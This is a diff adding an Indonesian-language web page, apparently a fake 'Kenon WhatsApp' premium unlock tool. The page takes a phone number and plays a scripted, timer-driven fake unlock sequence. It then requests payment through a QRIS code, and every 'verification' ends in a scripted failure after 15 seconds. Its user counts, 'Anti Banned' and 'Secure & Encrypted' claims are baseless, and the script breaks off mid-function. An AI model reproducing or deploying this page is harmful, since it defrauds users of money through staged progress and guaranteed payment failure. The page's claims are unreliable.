@@ -1,1 +1,374 @@
-not found 
+<!doctype html>
+<html lang="id" class="h-full">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kenon WhatsApp Unlocker</title>
+  <script src="https://cdn.tailwindcss.com/3.4.17"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Poppins', sans-serif; }
+    
+    .gradient-bg {
+      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+    }
+    
+    .glass-card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .glow-green {
+      box-shadow: 0 0 30px rgba(37, 211, 102, 0.3), 0 0 60px rgba(37, 211, 102, 0.1);
+    }
+    
+    .glow-text {
+      text-shadow: 0 0 20px rgba(37, 211, 102, 0.5);
+    }
+    
+    .btn-glow {
+      background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+      box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
+      transition: all 0.3s ease;
+    }
+    
+    .btn-glow:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(37, 211, 102, 0.6);
+    }
+    
+    .progress-bar {
+      background: linear-gradient(90deg, #25D366, #128C7E, #25D366);
+      background-size: 200% 100%;
+      animation: shimmer 2s infinite linear;
+    }
+    
+    @keyframes shimmer {
+      0% { background-position: -200% 0; }
+      100% { background-position: 200% 0; }
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    @keyframes pulse-ring {
+      0% { transform: scale(0.8); opacity: 1; }
+      100% { transform: scale(1.5); opacity: 0; }
+    }
+    
+    .float-animation {
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    .pulse-ring {
+      animation: pulse-ring 1.5s ease-out infinite;
+    }
+    
+    .feature-card {
+      transition: all 0.3s ease;
+    }
+    
+    .feature-card:hover {
+      transform: translateY(-5px);
+      background: rgba(37, 211, 102, 0.1);
+      border-color: rgba(37, 211, 102, 0.3);
+    }
+    
+    .typing-dot {
+      animation: typing 1.4s infinite ease-in-out;
+    }
+    
+    .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+    .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+    
+    @keyframes typing {
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-5px); }
+    }
+    
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: #25D366;
+      border-radius: 50%;
+      opacity: 0.3;
+    }
+  </style>
+  <style>body { box-sizing: border-box; }</style>
+  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
+  <script src="/_sdk/element_sdk.js" type="text/javascript"></script>
+ </head>
+ <body class="h-full gradient-bg text-white overflow-auto"><!-- Particles Background -->
+  <div id="particles" class="fixed inset-0 pointer-events-none overflow-hidden"></div>
+  <div class="min-h-full flex flex-col items-center justify-start py-8 px-4 relative z-10"><!-- Header -->
+   <div class="text-center mb-8">
+    <div class="relative inline-block mb-4">
+     <div class="absolute inset-0 bg-green-500 rounded-full blur-xl opacity-30 pulse-ring"></div>
+     <div class="relative w-20 h-20 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center float-animation glow-green">
+      <svg class="w-10 h-10 text-white" fill="currentColor" viewbox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
+      </svg>
+     </div>
+    </div>
+    <h1 class="text-3xl md:text-4xl font-bold mb-2 glow-text">Kenon WhatsApp</h1>
+    <p class="text-gray-400 text-sm md:text-base">Premium Unlock Tool v3.2.1</p>
+   </div><!-- Main Card -->
+   <div class="w-full max-w-md glass-card rounded-3xl p-6 md:p-8 mb-6"><!-- Status Section -->
+    <div id="status-section" class="text-center mb-8">
+     <div class="inline-flex items-center gap-2 bg-yellow-500/20 text-yellow-400 px-4 py-2 rounded-full text-sm mb-4"><span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> <span id="status-text">Menunggu Verifikasi</span>
+     </div>
+     <p class="text-gray-400 text-sm" id="status-desc">Masukkan nomor WhatsApp untuk memulai proses unlock</p>
+    </div><!-- Input Section -->
+    <div id="input-section"><label class="block text-gray-300 text-sm mb-2">Nomor WhatsApp</label>
+     <div class="relative mb-4"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">+62</span> <input type="tel" id="phone-input" placeholder="8123456789" class="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-14 pr-4 text-white placeholder-gray-500 focus:outline-none focus:border-green-500/50 focus:bg-white/10 transition-all">
+     </div><button id="unlock-btn" onclick="startUnlock()" class="w-full btn-glow text-white font-semibold py-4 rounded-xl flex items-center justify-center gap-2">
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z" />
+      </svg><span id="btn-text">Mulai Unlock</span> </button>
+    </div><!-- Progress Section (Hidden by default) -->
+    <div id="progress-section" class="hidden">
+     <div class="mb-6">
+      <div class="flex justify-between text-sm mb-2"><span class="text-gray-400" id="progress-label">Memproses...</span> <span class="text-green-400" id="progress-percent">0%</span>
+      </div>
+      <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+       <div id="progress-bar" class="h-full progress-bar rounded-full transition-all duration-300" style="width: 0%"></div>
+      </div>
+     </div>
+     <div class="space-y-3" id="process-steps"><!-- Steps will be added dynamically -->
+     </div>
+    </div><!-- Payment Section (Hidden by default) -->
+    <div id="payment-section" class="hidden text-center">
+     <h3 class="text-lg font-bold text-white mb-4">Scan QRIS untuk Verifikasi</h3>
+     <div class="bg-white/10 rounded-xl p-6 mb-4">
+      <img src="https://files.catbox.moe/5jgk6a.jpg" alt="QRIS Code" loading="lazy" class="w-48 h-48 rounded-lg mx-auto" onerror="console.error('Image failed to load:', this.src); this.style.background='#e5e7eb'; this.alt='Image unavailable';">
+     </div>
+     <p class="text-gray-400 text-sm mb-6">Gunakan aplikasi pembayaran Anda untuk scan QRIS di atas</p><button onclick="verifyPayment()" class="w-full btn-glow text-white font-semibold py-4 rounded-xl"> Sudah Bayar </button>
+    </div><!-- Loading Verification Section (Hidden by default) -->
+    <div id="loading-section" class="hidden text-center">
+     <p class="text-gray-400 text-sm mb-6">Memverifikasi pembayaran Anda...</p>
+     <div class="flex justify-center gap-2 mb-6">
+      <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
+      <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse" style="animation-delay: 0.2s"></div>
+      <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse" style="animation-delay: 0.4s"></div>
+     </div>
+     <p class="text-gray-500 text-xs">Proses verifikasi sedang berjalan...</p>
+    </div><!-- Payment Error Section (Hidden by default) -->
+    <div id="payment-error-section" class="hidden text-center">
+     <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+      <svg class="w-10 h-10 text-red-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+      </svg>
+     </div>
+     <h3 class="text-xl font-bold text-red-400 mb-2">Verifikasi Pembayaran Gagal</h3>
+     <p class="text-gray-400 text-sm mb-6">Sistem tidak mendeteksi pembayaran Anda. Silakan coba lagi atau hubungi support.</p><button onclick="resetForm()" class="w-full bg-white/10 hover:bg-white/20 text-white font-medium py-3 rounded-xl transition-all"> Kembali ke Menu Awal </button>
+    </div><!-- Success Section (Hidden by default) -->
+    <div id="success-section" class="hidden text-center">
+     <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+      <svg class="w-10 h-10 text-green-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+      </svg>
+     </div>
+     <h3 class="text-xl font-bold text-green-400 mb-2">Unlock Berhasil!</h3>
+     <p class="text-gray-400 text-sm mb-6">Semua fitur premium telah diaktifkan</p>
+     <div class="bg-white/5 rounded-xl p-4 mb-4">
+      <p class="text-gray-400 text-xs mb-1">Kode Aktivasi</p>
+      <p class="text-lg font-mono text-green-400" id="activation-code">XXXX-XXXX-XXXX</p>
+     </div><button onclick="resetForm()" class="w-full bg-white/10 hover:bg-white/20 text-white font-medium py-3 rounded-xl transition-all"> Unlock Nomor Lain </button>
+    </div>
+   </div><!-- Features Grid -->
+   <div class="w-full max-w-md grid grid-cols-2 gap-3 mb-6">
+    <div class="feature-card glass-card rounded-2xl p-4 text-center">
+     <div class="w-10 h-10 bg-blue-500/20 rounded-xl flex items-center justify-center mx-auto mb-2">
+      <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+      </svg>
+     </div>
+     <p class="text-xs text-gray-300">Anti Banned</p>
+    </div>
+    <div class="feature-card glass-card rounded-2xl p-4 text-center">
+     <div class="w-10 h-10 bg-purple-500/20 rounded-xl flex items-center justify-center mx-auto mb-2">
+      <svg class="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
+      </svg>
+     </div>
+     <p class="text-xs text-gray-300">HD Media</p>
+    </div>
+    <div class="feature-card glass-card rounded-2xl p-4 text-center">
+     <div class="w-10 h-10 bg-pink-500/20 rounded-xl flex items-center justify-center mx-auto mb-2">
+      <svg class="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+      </svg>
+     </div>
+     <p class="text-xs text-gray-300">Privacy Mode</p>
+    </div>
+    <div class="feature-card glass-card rounded-2xl p-4 text-center">
+     <div class="w-10 h-10 bg-orange-500/20 rounded-xl flex items-center justify-center mx-auto mb-2">
+      <svg class="w-5 h-5 text-orange-400" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+      </svg>
+     </div>
+     <p class="text-xs text-gray-300">Turbo Speed</p>
+    </div>
+   </div><!-- Stats -->
+   <div class="w-full max-w-md glass-card rounded-2xl p-4 mb-6">
+    <div class="flex justify-around text-center">
+     <div>
+      <p class="text-2xl font-bold text-green-400">2.5M+</p>
+      <p class="text-xs text-gray-400">Users</p>
+     </div>
+     <div class="w-px bg-white/10"></div>
+     <div>
+      <p class="text-2xl font-bold text-blue-400">99.9%</p>
+      <p class="text-xs text-gray-400">Success</p>
+     </div>
+     <div class="w-px bg-white/10"></div>
+     <div>
+      <p class="text-2xl font-bold text-purple-400">24/7</p>
+      <p class="text-xs text-gray-400">Support</p>
+     </div>
+    </div>
+   </div><!-- Footer -->
+   <div class="text-center">
+    <p class="text-gray-500 text-xs mb-2">🔒 Secure &amp; Encrypted Connection</p>
+    <p class="text-gray-600 text-xs">© 2024 Kenon WhatsApp. Demo Only.</p>
+   </div>
+  </div>
+  <script>
+    // Create floating particles
+    function createParticles() {
+      const container = document.getElementById('particles');
+      for (let i = 0; i < 30; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particle.style.animation = `float ${3 + Math.random() * 4}s ease-in-out infinite`;
+        container.appendChild(particle);
+      }
+    }
+    createParticles();
+    
+    const steps = [
+      { label: 'Menghubungkan ke server...', duration: 800 },
+      { label: 'Memverifikasi nomor...', duration: 1200 },
+      { label: 'Menganalisis akun...', duration: 1000 },
+      { label: 'Mengaktifkan fitur premium...', duration: 1500 },
+      { label: 'Menerapkan proteksi...', duration: 800 },
+      { label: 'Finalisasi unlock...', duration: 600 }
+    ];
+    
+    function startUnlock() {
+      const phoneInput = document.getElementById('phone-input');
+      const phone = phoneInput.value.trim();
+      
+      if (phone.length < 9) {
+        phoneInput.style.borderColor = '#ef4444';
+        phoneInput.classList.add('shake');
+        setTimeout(() => {
+          phoneInput.style.borderColor = '';
+          phoneInput.classList.remove('shake');
+        }, 500);
+        return;
+      }
+      
+      // Hide input, show progress
+      document.getElementById('input-section').classList.add('hidden');
+      document.getElementById('progress-section').classList.remove('hidden');
+      
+      // Update status
+      document.getElementById('status-text').textContent = 'Sedang Memproses';
+      document.getElementById('status-desc').textContent = 'Mohon tunggu, jangan tutup halaman ini';
+      document.querySelector('#status-section .inline-flex').classList.remove('bg-yellow-500/20', 'text-yellow-400');
+      document.querySelector('#status-section .inline-flex').classList.add('bg-blue-500/20', 'text-blue-400');
+      document.querySelector('#status-section .inline-flex span:first-child').classList.remove('bg-yellow-400');
+      document.querySelector('#status-section .inline-flex span:first-child').classList.add('bg-blue-400');
+      
+      runProcess();
+    }
+    
+    async function runProcess() {
+      const progressBar = document.getElementById('progress-bar');
+      const progressPercent = document.getElementById('progress-percent');
+      const progressLabel = document.getElementById('progress-label');
+      const stepsContainer = document.getElementById('process-steps');
+      
+      let totalProgress = 0;
+      const progressPerStep = 100 / steps.length;
+      
+      for (let i = 0; i < steps.length; i++) {
+        const step = steps[i];
+        
+        // Add step element
+        const stepEl = document.createElement('div');
+        stepEl.className = 'flex items-center gap-3 text-sm';
+        stepEl.innerHTML = `
+          <div class="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center">
+            <div class="flex gap-1">
+              <span class="typing-dot w-1 h-1 bg-blue-400 rounded-full"></span>
+              <span class="typing-dot w-1 h-1 bg-blue-400 rounded-full"></span>
+              <span class="typing-dot w-1 h-1 bg-blue-400 rounded-full"></span>
+            </div>
+          </div>
+          <span class="text-gray-400">${step.label}</span>
+        `;
+        stepsContainer.appendChild(stepEl);
+        
+        progressLabel.textContent = step.label;
+        
+        // Animate progress
+        await new Promise(resolve => setTimeout(resolve, step.duration));
+        
+        totalProgress += progressPerStep;
+        progressBar.style.width = totalProgress + '%';
+        progressPercent.textContent = Math.round(totalProgress) + '%';
+        
+        // Mark step as complete
+        stepEl.innerHTML = `
+          <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center">
+            <svg class="w-3 h-3 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
+            </svg>
+          </div>
+          <span class="text-green-400">${step.label.replace('...', '')} ✓</span>
+        `;
+      }
+      
+      // Complete
+      await new Promise(resolve => setTimeout(resolve, 500));
+      showPayment();
+    }
+    
+    function showPayment() {
+      document.getElementById('progress-section').classList.add('hidden');
+      document.getElementById('payment-section').classList.remove('hidden');
+      
+      // Update status
+      document.getElementById('status-text').textContent = 'Pembayaran Diperlukan';
+      document.getElementById('status-desc').textContent = 'Scan QRIS untuk melanjutkan proses unlock';
+      document.querySelector('#status-section .inline-flex').classList.remove('bg-blue-500/20', 'text-blue-400');
+      document.querySelector('#status-section .inline-flex').classList.add('bg-purple-500/20', 'text-purple-400');
+      document.querySelector('#status-section .inline-flex span:first-child').classList.remove('bg-blue-400');
+      document.querySelector('#status-section .inline-flex span:first-child').classList.add('bg-purple-400');
+    }
+    
+    function verifyPayment() {
+      document.getElementById('payment-section').classList.add('hidden');
+      document.getElementById('loading-section').classList.remove('hidden');
+      
+      // Update status
+      document.getElementById('status-text').textContent = 'Verifikasi Pembayaran';
+      document.getElementById('status-desc').textContent = 'Sistem sedang memverifikasi pembayaran Anda...';
+      
+      // Loading 15 detik (15000 ms)
+      setTimeout(() => {
+        showPaymentError();
+      }, 15000);
+    }
+    
+    function showPaymentError() {
+      document.getElementById('loading-section').classList.add('hidden');
+      document.getElementById('payment-error-section').classList.remove('hidden');
+      
+      // Update status
+      document.getElementById('status-text').textContent = 'Verifikasi Gagal';
+      document.getElementById('status-desc').textContent = 'Pembayaran tidak terdeteksi oleh sistem';
+      document.querySelector('#status-section .inline-flex').classList.remove('bg-purple-500/20', 'text-purple-400');
+      document.querySelector('#status-section .inline-flex').classList.add('bg-red-500/20', 'text-red-400');
+      document.querySelector('#status-section .inline-flex span:first-child').classList.remove('bg-purpl
